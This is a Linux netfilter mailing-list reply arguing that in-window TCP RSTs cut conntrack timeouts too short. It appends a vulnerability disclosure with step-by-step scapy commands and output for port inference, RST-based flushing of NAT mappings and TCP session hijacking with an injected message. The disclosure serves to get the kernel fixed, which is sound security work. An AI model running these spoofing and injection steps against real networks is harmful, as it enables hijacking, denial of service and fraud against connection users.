Received: from mail-pg1-f196.google.com (mail-pg1-f196.google.com [209.85.215.196])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E00883BBDE;
	Mon,  8 Jul 2024 09:00:06 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.196
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1720429208; cv=none; b=gIrFd86/QOV/87qly71DZcKcimWHblKunyCusEF57N8D9oAhnIvVOUnFzg4OLEzVKxukJ/+YVrQBdSn9sI/+6ymzOWdgqLqx7ZRzJKSbpxY9UOdoXesp3CNsyky8d0L36jZptE+6W7rI4Z7+KBPO/zTxrLY7Aa8y8Vq6Ffq6ono=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1720429208; c=relaxed/simple;
	bh=nATj1CrkD3M5ZQBvTRMFlSNYpv+9d3iwPUG13Dr4/bk=;
	h=From:To:Cc:Subject:Date:Message-Id:In-Reply-To:References:
	 MIME-Version:Content-Type; b=CDK5YqH48hy2+jsmg1Cl8/fUJLalBeTa7VUPCdp+5vewGk3mHqTLJt7bLOY6BL+AzJNPp/kYwvkd1Uj/ebMoSYbD3W1Hz9bnsbqXhxvHrwyUOdLaLFrcai+9CStzpxdMiTdm/36lrWdRbTeUjC9vdUUVC3OKILY8dGBsE4AA84k=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=nQsJNCEl; arc=none smtp.client-ip=209.85.215.196
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="nQsJNCEl"
Received: by mail-pg1-f196.google.com with SMTP id 41be03b00d2f7-75fe9e62048so1731189a12.0;
        Mon, 08 Jul 2024 02:00:06 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1720429206; x=1721034006; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
         :message-id:reply-to;
        bh=wEf4U9FfrWPLRl+M9U/2VdfaSS432mVoeRCFT3Dec9U=;
        b=nQsJNCEliSPiq3bJuQvEf4JJTooG8rM8/VLi56mYnQfTNXsFJmgPvJvc3OYdTMaiQE
         hVnamubkPMwuTGqA6Ih3IVlvfbmg1ZD/clSof0pK9b+3qs+nRcaQDxRxy4t5g1VxJY3u
         T6Ckj2Zrf6VQFKFQb5GFlD4P1EHMRuUesV3DdvnWP5zxcNKY9HB64EeM34KhyrzvCdKY
         fpzCFjW8/3qb61F9jbO2ozC6xLY+/T71a7RPs3LLMSN+5FRxLE7dnf/QdMYQV9JuR6GN
         6WA+M/tuXOBi/6vKQO5s5NQexA6tKhEFGjnqS7Dr7shPRcTuBrpWtZtZ+bREvc2929te
         zfaw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1720429206; x=1721034006;
        h=content-transfer-encoding:mime-version:references:in-reply-to
         :message-id:date:subject:cc:to:from:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=wEf4U9FfrWPLRl+M9U/2VdfaSS432mVoeRCFT3Dec9U=;
        b=onGsfJKKkgRrNnOQRE1C2ecdPdDd2SAVtUft4R90//3K1CCBcTSew4Qerxf9+LmJk7
         3PARBnt9PCeD53dy6sho7PCBmRTm+X8DXV1yYAOVQmNDoIONqXQV9bJPU031HjGLq6cJ
         hGEyb5W6O9o79UaJNJDqkEMHiouoLFcgYWtWkHYdMZBwh3wiYtVo0cFZu6TSetCyS6iB
         ublW3+akQ10DzpvVxNl9l5NYwfw3J7So0INp/kBOsLFDGSrzXaxjbwV8jBF9PMRWBzY/
         vYAoZPI8E9L+FzFOSmLy3flchVVReP8AXhk8mQS3Qc1mPjruMBU099FeHavhKciWrnSe
         M7FA==
X-Forwarded-Encrypted: i=1; AJvYcCWwM+Kib/SrJfqNS0XBMCiFYf9gdpBB9vemEjmwZAEYlEYHN8Sdsebq42hlnrd5jfW1ASWlDjoK7w5gJyWRuXJYAysDAWeyikdXU0WTaId7YFNOrwtK2ejLOd/2e/FHAs0iJ6dRMDU3SHtsuh/8ENrlG70odweLKP6zqHLCCE7XpKoIFf8u
X-Gm-Message-State: AOJu0YzFtE0hRucSMcIl3Oi3OxKArEi6QxhfkaIhOvhp4IYRtYg4tQaY
	j5isKXGW5YVxut74zz4B7tqrF9+TRBhwcZsFt3tafCA4nQniphqT
X-Google-Smtp-Source: AGHT+IFlBJ30K1zy0sFTvU3IIOgbI2eq9YZPI42yKHUNp0+ZAHhrbnnP/MIOGbcuPOGxyJUltMPs1A==
X-Received: by 2002:a05:6a20:da9a:b0:1c2:8b7f:5eb4 with SMTP id adf61e73a8af0-1c28b7f61ddmr1001626637.5.1720429205793;
        Mon, 08 Jul 2024 02:00:05 -0700 (PDT)
Received: from localhost.localdomain ([166.111.236.150])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-1fb6b03b4absm36910525ad.219.2024.07.08.02.00.01
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 08 Jul 2024 02:00:05 -0700 (PDT)
From: yyxRoy <yyxroy22@gmail.com>
X-Google-Original-From: yyxRoy <979093444@qq.com>
To: fw@strlen.de
Cc: 979093444@qq.com,
	coreteam@netfilter.org,
	davem@davemloft.net,
	edumazet@google.com,
	gregkh@linuxfoundation.org,
	kadlec@blackhole.kfki.hu,
	kuba@kernel.org,
	linux-kernel@vger.kernel.org,
	netdev@vger.kernel.org,
	netfilter-devel@vger.kernel.org,
	pabeni@redhat.com,
	pablo@netfilter.org,
	yyxroy22@gmail.com
Subject: Re: [PATCH] netfilter: conntrack: tcp: do not lower timeout to CLOSE for in-window RSTs
Date: Mon,  8 Jul 2024 16:59:40 +0800
Message-Id: <20240708085940.300976-1-979093444@qq.com>
X-Mailer: git-send-email 2.34.1
In-Reply-To: <20240706170432.GA7766@breakpoint.cc>
References: <20240706170432.GA7766@breakpoint.cc>
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

On Fri, 5 Jul 2024 at 17:43, Florian Westphal <fw@strlen.de> wrote:
> Also, one can send train with data packet + rst and we will hit
> the immediate close conditional:
> 
>    /* Check if rst is part of train, such as
>     *   foo:80 > bar:4379: P, 235946583:235946602(19) ack 42
>     *   foo:80 > bar:4379: R, 235946602:235946602(0)  ack 42
>     */
>     if (ct->proto.tcp.last_index == TCP_ACK_SET &&
>         ct->proto.tcp.last_dir == dir &&
>         seq == ct->proto.tcp.last_end)
>             break;
> 
> So even if we'd make this change it doesn't prevent remote induced
> resets.

Thank you for your time and prompt reply and for bringing to my attention the case
I had overlooked. I acknowledge that as a middlebox, Netfilter faces significant
challenges in accurately determining the correct sequence and acknowledgment
numbers. However, it is crucial to consider the security implications as well.

For instance, previously, an in-window RST could switch the mapping to the
CLOSE state with a mere 10-second timeout. The recent patch, 
 (netfilter: conntrack: tcp: only close if RST matches exact sequence),
has aimed to improve security by keeping the mapping in the established state
and extending the timeout to 300 seconds upon receiving a Challenge ACK.

However, this patch's efforts are still insufficient to completely prevent attacks.
As I mentioned, attackers can manipulate the TTL to prevent the peer from
responding to the Challenge ACK, thereby reverting the mapping to the
10-second timeout. This duration is quite short and potentially dangerous,
leading to various attacks, including TCP hijacking (I have included a detailed 
report on potential attacks if time permits). 
else if (unlikely(index == TCP_RST_SET))
       timeout = timeouts[TCP_CONNTRACK_CLOSE];

The problem is that current netfilter only checks if the packet has the RST flag
(index == TCP_RST_SET) and lowers the timeout to that of CLOSE (10 seconds only).
I strongly recommend implementing measures to prevent such vulnerabilities.
For example, in the case of an in-window RST, could we consider lowering
the timeout to 300 seconds or else?

Thank you for considering these points. Once again, thank you for your time and 
efforts in enhancing community security and usability.

Best regards,
Yuxiang
****************************************************************************************************************************************************************************************************

Here is a case study illustrating how a 10-second timeout can lead to a TCP hijacking attack for you if you are interested. I hope it won't waste your time and effort. Additionally, I hope the plain text format will clearly explain the situation. 

**General Disclosure: Linux Netfilter’s Vulnerability of Lacking Sufficient TCP Sequence Number Validation

1. Threat model
Figure 1 shows the threat model of the TCP hijacking attack. The victim client behind Linux with Netfilter enabled connect to the remote victim server using TCP to access online services. There will be a malicious inside attacker in the same LAN such as in the Wi-Fi or VPN NAT scenarios. The attacker can also control a machine with the ability of IP spoofing on the Internet. The malicious attacker in the LAN can hijack the TCP session between another client and the remote server, thereby terminating the original TCP connection or injecting forged messages into the connection, which may lead to denial of service attacks or privacy leakage attacks.

victim-client                                                      remote-server
             \                                                   /
              \                                                 /
               \                                               /
                ----------NAT device with Netfilter ----------
               /                                              \  
              /                                                \
             /                                                  \
local-attacker                                                    IP-spoofable-machine
                                                                  (controlled by the attacker)
Fig 1. Threat model of the TCP hijacking attack.

2. Experiment Setup
We will take VPN scenarios as the example cases in the disclosure. We create a test environment as shown in Fig.2. The machines are all equiped with Ubuntu 22.04 running the Linux kernel. We configured the NAT device as the VPN server with OpenVPN. And the client and attacker are connecting to it with OpenVPN.
The victim client establishes a TCP connection with the remote server (such as SSH connections or accessing web pages). Here we take a simple TCP connection as an example in which the client and server run the netcat program to establish a connection as follows.

vpn-client (tun0:10.8.0.3)                                                remote-server (eth0:43.159.39.110)
          \                                                                                          /
           \                                                                                        /
            \                                                                                      /
             ---- (tun0:10.8.0.1) vpn server (eth0:43.163.229.240)---
           /                                                                                       \  
         /                                                                                          \
        /                                                                                            \
local-attacker (tun0:10.8.0.2)                                         IP-spoofable-machine
                                                                                       (controlled by the attacker)

Fig 2. Testing environment.

The server starts the netcat service and listens to port 80.
------------------
remote-server@remote-server:~$sudo nc -l -p 80
hello,i'm client
HELLO,I'M SERVER
------------------
The victim establishes a TCP connection with the source port 40000
------------------
victim-client@victim-client:~$nc 43.159.39.110 80 -p 40000
hello,i'm client
HELL0,I'M SERVER
------------------
There will be a corresponding NAT mapping recoreded by Netfilter as follows:
------------------
VPN-server@VPN-server:~$sudo conntrack -L | grep 43.159.39.110
tcp 6431973 ESTABLISHED src=10.8.0.3 dst=43.159.39.110 sport=40000 dport=80 src=43.159.39.110 dst=10.203.0.5 sport=80 dport=40000 [ASSURED] mark=0 use=1
------------------


3．Attack Steps
3.1 In the first step, the attacker infers the TCP source port used by the victim.
(1) The attacker constructs a SYN packet from itself to the server with a guessed source port m. In most cases, the attacker cannot guess the right source port. For example, m is 50000.
------------------
local-attacker@local-attacker:~$ sudo scapy
>>>send(IP(src="10.8.0.2",dst=43.159.39.110",ttl=2)/TCP(seq=1,ack=1,sport=50000,dport=80,flags="S"),iface="tun0")
------------------
Netfilter will create a new NAT mapping to record the session as followed:
------------------
VPN-server@VPN-server:~$sudo conntrack -L | grep 43.159.39.110
tcp 6 431841 ESTABLISHED src=10.8.0.3 dst=43.159.39.110 sport=40000 dport=80 src=43.159.39.110 dst=10.203.0.5 sport=80 dport=40000 [ASSURED]mark=0 use=1
tcp 6 115 SYN_SENT src=10.8.0.2 dst=43.159.39.110 sport=50000 dport=80 [UNREPLIED] src=43.159.39.110 dst=10.203.0.5 sport=80 dport=50000 mark=0 use=1
------------------
Then the attacker can controlled its spoof machine to send a spoofed SYN/ACK packet as the server to the NAT device’s external IP address with the guessed port to verify it.
------------------
spoofable-machine@spoofable-machine:~$ sudo scapy
>>>send(IP(src="43.159.39.110",dst="43.163.229.240")/TCP(seq=1,ack=1,sport=80,dport=50000,flags="SA"))
------------------
In this case, the SYN/ACK packet will match the attacker’s mapping and be forwarded to the attacker as it matches the second NAT mapping.
local-attacker@local-attacker:~$ sudo tcpdump -i any -nSvvv host 43.159.39.110
16:20:31.073779 tun0 Out IP (tos 0x0, ttl 2, id 1, offset 0, flags [none], proto TCP (6), length 40)
    10.8.0.2.50000 > 43.159.39.110.80:Flags [S], cksum Ox6f29(correct),seq 1, win 8192, length 0
16:22:11.608374 tun0 In IP (tos 0x64, ttl 54, id 1, offset 0, flags [none], proto TCP (6), length 40)
    43.159.39.110.80 > 10.8.0.2.50000:Flags [S.], cksum 0x6f19(correct),seq 1, ack 1, win 8192, length 0
------------------

(2) However, when the attacker guesses the right source port (i.e., 40000) to send the SYN packet.
------------------
local-attacker@local-attacker:~$ sudo scapy
>>>send(IP(src="10.8.0.2",dst=43.159.39.110",ttl=2)/TCP(seq=1,ack=1,sport=40000,dport=80,flags="S"),iface="tun0")
------------------
Netfilter will translate it to another random source port to deal with port collision. For example, it chooses 63503 and the NAT mapping is as followed.
------------------
VPN-server@VPN-server:~$sudo conntrack -L | grep 43.159.39.110
tcp 6 431841 ESTABLISHED src=10.8.0.3 dst=43.159.39.110 sport=40000 dport=80 src=43.159.39.110 dst=10.203.0.5 sport=80 dport=40000 [ASSURED]mark=0 use=1
tcp 6 114 SYN_SENT src=10.8.0.2 dst=43.159.39.110 sport=40000 dport=80 [UNREPLIED] src=43.159.39.110 dst=10.203.0.5 sport=80 dport=63503 mark=0 use=1
------------------
Then the attacker controls its spoof machine to send the verified SYN/ACK packet with guessed port 40000.
------------------
spoofable-machine@spoofable-machine:~$ sudo scapy
>>>send(IP(src="43.159.39.110",dst="43.163.229.240")/TCP(seq=1,ack=1,sport=80,dport=40000,flags="SA"))
------------------
However, this time it will be forwarded to the victim client instead of the attacker as it will match the first NAT mapping

Finally, the attacker can find the source port used by the victim device by traversing the entire possible space of the source ports through the above-mentioned difference between guessing the source port correctly/wrongly, that is, whether it can receive the spoofed SYN/ACK packet.
 
3.2 In the second step, the attacker intercepts the message of the victim's current TCP connection to obtain the accurate sequence number and acknowledge number.
(1) Since current version of Netfilter does not check the sequence number strictly, an RST packet with an in-window sequence number can cause the change of the mapping state. With previous patch (https://github.com/torvalds/linux/commit/be0502a3f2e94211a8809a09ecbc3a017189b8fb) to fight against blind TCP reset attacks, instead of directly transferring the state of the NAT mapping to CLOSE with a 10-second timeout, the state will keep in the state of ESTABLISHED, but the timeout will still be decreased to 10 seconds. As the in-window RST will trigger the endpoint to respond with a Challenge ACK packet back, the timeout of the mapping will be updated to 300 seconds.
However, we find that the update of the timeout can be bypassed by the malicious attacker. The attacker can probe the TTL value between the NAT device and the spoof machine and send an in-window RST packet with a TTL value to be decreased to 0 after arriving at the NAT device, thus it will be dropped rather than forwarded to the victim client and no Challenge ACK will be triggered. Besides, as the window of the sequence number is quite large (bigger than 60,000 in our test) and the sequence number is 16-bit, the attacker only needs to send nearly 60,000 RST packets with different sequence numbers (i.e., 1, 60001, 120001, and so on) and one of them will definitely locate in the window.
------------------
spoofable-machine@spoofable-machine:~$ sudo scapy
>>>send(IP(src="43.159.39.110",dst="43.163.229.240",ttl=10)/TCP(seq=1319804841+60000,ack=1,sport=80,dport=40000,flags="R"))
------------------
It only takes a rather short time (nearly 1-2 seconds) for current machines to send 60,000 RST packets. In this way, the NAT mapping will be quickly cleaned after the RST packets.
------------------
VPN-server@VPN-server:~$sudo conntrack -L | grep 43.159.39.110
tcp 6 431841 ESTABLISHED src=10.8.0.3 dst=43.159.39.110 sport=40000 dport=80 src=43.159.39.110 dst=10.203.0.5 sport=80 dport=40000 [ASSURED]mark=0 use=1
VPN-server@VPN-server:~$#####After RST
VPN-server@VPN-server:~$sudo conntrack -L | grep 43.159.39.110
tcp 6 10 ESTABLISHED src=10.8.0.3 dst=43.159.39.110 sport=40000 dport=80 src=43.159.39.110 dst=10.203.0.5 sport=80 dport=40000 [ASSURED]mark=0 use=1
VPN-server@VPN-server:~$#####After 10 seconds
VPN-server@VPN-server:~$sudo conntrack -L | grep 43.159.39.110
tcp 6 0 ESTABLISHED src=10.8.0.3 dst=43.159.39.110 sport=40000 dport=80 src=43.159.39.110 dst=10.203.0.5 sport=80 dport=40000 [ASSURED]mark=0 use=1
VPN-server@VPN-server:~$#####After that
VPN-server@VPN-server:~$sudo conntrack -L | grep 43.159.39.110
------------------

(2) After the NAT mapping disappears, the attacker constructs a TCP data packet to the server. After NAT, it seems the same as those sent from the victim client. The server will respond an ACK packet back to the attacker, which contains the correct sequence and acknowledge numbers as shown below:
------------------
local-attacker@local-attacker:~$ sudo scapy
>>>send(IP(src="10.8.0.2",dst=43.159.39.110")/TCP(seq=1,ack=1,sport=40000,dport=80,flags="PA"),iface="tun0")

local-attacker@local-attacker:~$ sudo tcpdump -i any -nSvvv host 43.159.39.110
16:44:21.141636 tun0 Out IP (tos Ox0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 40)
    10.8.0.2.40000 > 43.159.39.110.80: Flags [P.], cksum 0x9623 (correct), seq 1, ack 1, win 8192, length 0
16:44:21.255077 tun0 In IP (tos 0x64, ttl 54, id 20259, offset 0, flags [DF], proto TCP (6), length 52)
    43.159.39.110.80 >10.8.0.2.40000: Flags [.],cksum Ox651c (correct), seq 1319804847, ack 684909974, win 509, options[nop,nop,TS val 1722395496 ecr 995347412], length 0
------------------

3.3 In the third step, the attacker can use the obtained source port, sequence number, acknowledge number, etc. to choose to send an RST packet to terminate the original TCP connection (such as SSH service, etc.), inject fake messages into the original TCP connection to manipulate the sessions (such as Web HTTP pages, etc.), or send requests to the server.
------------------
local-attacker@local-attacker:~$ sudo scapy
>>>send(IP(src="10.8.0.2",dst=43.159.39.110")/TCP(seq=684909974,ack=1319804847,sport=40000,dport=80,flags="PA")/"You are hijacked, send me money",iface="tun0")
------------------
On the server machine, the spoofed messages will be accepted as the sequence and acknowledgment numbers are right.
------------------
remote-server@remote-server:~$sudo nc -l -p 80
hello,i'm client
HELLO,I'M SERVER
You are hijacked, send me money
------------------------------

